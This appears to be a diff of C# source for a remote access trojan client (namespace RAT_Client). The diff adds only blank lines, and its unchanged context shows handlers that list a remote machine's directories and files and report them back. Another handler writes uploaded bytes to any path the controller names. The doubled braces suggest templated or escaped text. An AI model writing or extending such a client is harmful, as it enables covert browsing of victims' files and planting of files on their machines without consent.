@@ -177,14 +177,20 @@ namespace RAT_Client
         {{
             try
             {{
+
+    
+
                 var dirs = string.Join(";", Directory.GetDirectories(path));
                 var files = string.Join(";", Directory.GetFiles(path));
                 writer.WriteLine($"{{dirs}}|{{files}}");
+
                 writer.Flush();
             }}
             catch (Exception ex)
             {{
+
                 writer.WriteLine($"ERROR:{{ex.Message}}");
+ 
                 writer.Flush();
             }}
         }}
@@ -200,7 +206,9 @@ namespace RAT_Client
             }}
             catch (Exception ex)
             {{
+
                 writer.WriteLine($"ERROR:{{ex.Message}}");
+ 
                 writer.Flush();
             }}
         }}
@@ -212,7 +220,10 @@ namespace RAT_Client
                 var parts = command.Split('|');
                 if (parts.Length != 3 || !int.TryParse(parts[2], out int size))
                 {{
+
+
                     writer.WriteLine("ERROR:INVALID_UPLOAD_COMMAND");
+
                     writer.Flush();
                     return;
                 }}
@@ -226,12 +237,17 @@ namespace RAT_Client
                     read += r;
                 }}
                 File.WriteAllBytes(parts[1], buffer);
+
+
+
                 writer.WriteLine("OK");
                 writer.Flush();
             }}
             catch (Exception ex)
             {{
+
                 writer.WriteLine($"ERROR:{{ex.Message}}");
+
                 writer.Flush();
             }}
         }}
@@ -253,6 +269,9 @@ namespace RAT_Client
             }}
             catch (Exception ex)
             {{
+
+
+
                 writer.WriteLine($"ERROR:{{ex.Message}}");
                 writer.Flush();
             }}
